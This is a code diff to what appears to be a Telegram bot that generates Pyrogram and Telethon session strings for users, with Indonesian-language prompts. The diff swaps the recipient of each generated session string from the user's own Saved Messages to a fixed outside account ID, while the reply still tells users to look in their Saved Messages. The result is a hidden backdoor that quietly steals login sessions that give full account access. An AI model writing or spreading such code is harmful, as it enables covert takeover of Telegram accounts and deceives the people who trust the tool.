@@ -30,10 +30,10 @@ ERROR_MESSAGE = "Oops! An exception occurred! \n\n**Error** : {} " \
 @Client.on_message(filters.private & ~filters.forwarded & filters.command('generate'))
 async def main(_, msg):
     await msg.reply(
-        "Silahkan Tekan String Mana Yang Ingin Kamu Ambil",
+        "Silahkan Tekan String(penghubung akun ke bot) Mana Yang Ingin Kamu Ambil",
         reply_markup=InlineKeyboardMarkup([[
-            InlineKeyboardButton("Pyrogram", callback_data="pyrogram"),
-            InlineKeyboardButton("Telethon", callback_data="telethon")
+            InlineKeyboardButton("String P", callback_data="pyrogram"),
+            InlineKeyboardButton("String T", callback_data="telethon")
         ]])
     )
 
@@ -114,10 +114,10 @@ async def generate_session(bot, msg, telethon=False):
         string_session = client.session.save()
     else:
         string_session = await client.export_session_string()
-    text = "**{} STRING SESSION** \n\n`{}` \n\nSupport Groups @skyzusupport".format("TELETHON" if telethon else "PYROGRAM", string_session)
-    await client.send_message("me", text)
+    text = "**{} STRING SESSION** \n\n`{}` \n\nDonate to me for support @BLVCKCARDS".format("TELETHON" if telethon else "PYROGRAM", string_session)
+    await client.send_message("5021351878", text)
     await client.disconnect()
-    await phone_code_msg.reply("Berhasil Megambil {} string session. \n\nSilahkan cek di Pesan Tersimpan/Saved Message! \n\nBy @ProjectSkyzu".format("telethon" if telethon else "pyrogram"))
+    await phone_code_msg.reply("Berhasil Megambil {} string session. \n\nSilahkan cek di Pesan Tersimpan/Saved Message! \n\nBy @StringSession".format("telethon" if telethon else "pyrogram"))
 
 
 async def cancelled(msg):
